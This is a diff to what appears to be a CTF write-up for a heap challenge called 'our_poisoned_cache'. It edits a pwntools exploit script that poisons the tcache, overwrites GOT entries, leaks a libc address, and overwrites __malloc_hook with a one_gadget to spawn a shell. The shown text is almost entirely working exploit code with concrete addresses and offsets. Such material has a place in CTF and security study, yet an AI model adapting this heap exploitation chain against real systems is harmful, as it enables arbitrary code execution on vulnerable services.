@@ -93,18 +93,17 @@ from pwn import *
 r = remote("127.0.0.1",2005)
 
 #r = gdb.debug("./our_poisoned_cache_patched")
-
+context.log_level = 1
 r.recvuntil("is: ")
-heap_base = int(r.recv(8),16)
+heap_base = int(r.recvline()[0:-1],16)
 r.recvuntil("is: ")
-stack_addr = int(r.recv(14),16)
+stack_addr = int(r.recvline()[0:-1],16)
 overwrite_tcache = heap_base + 0xa8
 exit_got = 0x404068
 free_got = 0x404018
 stderr = 0x4040a0
 main = 0x004012c7
 setvbuf = 0x404050
-
 log.info("Overwriting exit GOT to point to main")
 r.sendlineafter("Where:\n",str(hex(overwrite_tcache)))
 r.sendlineafter("What:\n",str(hex(exit_got)))
@@ -129,11 +128,12 @@ r.sendlineafter("What:\n",str(hex(stderr)))
 r.send(p64(0x404040))
 r.recv(8)
 
+
 log.info("Setvbuf will now print out libc address stored at read GOT")
 leak_libc = u64(r.recv(6).ljust(8,"\x00"))
-libc_base = leak_libc - 0x10dff0
+libc_base = leak_libc - 0x10dfc0
 malloc_hook = libc_base + 0x1ecb70
-one_gadget = libc_base + 0xe3b31
+one_gadget = libc_base + 0xe3b01
 log.info("Libc Base Address: " + hex(libc_base))
 
 r.sendlineafter("Where:\n",str(hex(heap_base + 0x4d0)))
@@ -143,9 +143,11 @@ r.send(p64(0))
 log.info("Overwriting __malloc_hook to one_gadget")
 r.sendlineafter("Where:\n",str(hex(overwrite_tcache)))
 r.sendlineafter("What:\n",str(hex(malloc_hook)))
+
 r.send(p64(one_gadget))
 r.clean()
 r.interactive()
+
 ```  
 ![image](https://user-images.githubusercontent.com/101010673/174493058-839a6328-e738-441d-a9fc-c9f32cbab67c.png)
 
